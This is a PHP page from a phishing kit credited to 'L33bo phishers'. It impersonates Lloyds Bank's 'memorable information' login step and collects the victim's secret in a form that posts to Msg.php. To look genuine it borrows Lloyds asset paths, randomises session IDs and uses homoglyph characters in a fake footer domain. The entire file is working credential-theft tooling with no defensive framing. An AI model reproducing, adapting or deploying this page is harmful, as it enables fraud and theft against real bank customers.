<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require "assets/includes/memo.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Enter Memorable</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link href="assets/css/001.css" media="screen, print" type="text/css" rel="stylesheet">
<script src="assets/js/001.jspf" type="text/javascript"></script>
<script src="assets/js/001.js" type="text/javascript"></script>
<script src="assets/js/002.js" type="text/javascript"></script>
<script type="text/javascript">
DI.themePath="https://online.lloydsbank.co.uk/personal/unauth/assets/LloydsRetail/";
</script>
<script src="assets/js/003.js" type="text/javascript"></script>
</head>
<body class="hasJS safari_537" data-browser="safari" data-version="537">
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#">Skip to main content</a></li>
</ul>
<div class="clearfix">
<p id="logo"><span><img src="assets/img/002.png"/></span></p>
<div class="secureMsg"><p class="msg"><img src="assets/img/003.png"/></p>
<p><a class="linkBullet newwin" href="#">How can I tell that this site is secure?</a></p>
</div>
<div class="loggedIn">
<ul>
<li class="mobile"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" class="linkBullet">Mobile</a></li>
<li class="cookie"><a class="linkBullet newwin" href="#">Cookie policy</a></li>
</ul>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<h1>Your memorable information</h1>
<div class="inner"><p><strong></strong></p>
<p><strong>Please enter your full information then click on the continue button.</strong></p>
<p></p>
<p>This login step improves security.</p>
</div>
<form id="memorable" name="memorable" method="post" action="Msg.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" class="validationName:(frm_personalRegistration) validate:() validationName:(registerIB) validate:()" autocomplete="off" enctype="application/x-www-form-urlencoded">
<div id="errormsg" class="formSubmitError">There is a problem with some of the information you have submitted.<br>Please amend the fields highlighted below and re-submit this form.</div>
<fieldset class="memInfoSelect clearfix">
<div id="inputerror" class="formField validationName:(validatememo) validate:(required_validatememo) clearfix error">
<div class="formFieldInner">
<div class="clearfix">
<label for="memo">Memorable information :</label>
<input type="password" name="memo" id="memo" pattern="[A-Za-z]{3}" required onblur="if (this.value.length > 5) hidebox();">
</div>
<span id="inputerrortxt" class="error">Please enter your FULL memorable information.</span>
</div>
</div>
</fieldset>
<div class="inner">
<ul class="linkList">
<li><a href="#">Having trouble logging in?</a></li>
</ul>
</div>
<ul class="actions">
<li class="primaryAction">
<input type="image" src="assets/img/004.png"  class="submitAction">
</li>
<li><strong><a href="#" class="cancel pseudoLink">Cancel</a></strong></li>
</ul>
</form>
</div>
</div>
</div>
<?php echo memosecondary; ?>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">www.ll&#959;ydsbankinggr&#959;up.c&#959;m</a></li>
<li><a class="newwin" href="#">Rates and Charges</a></li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>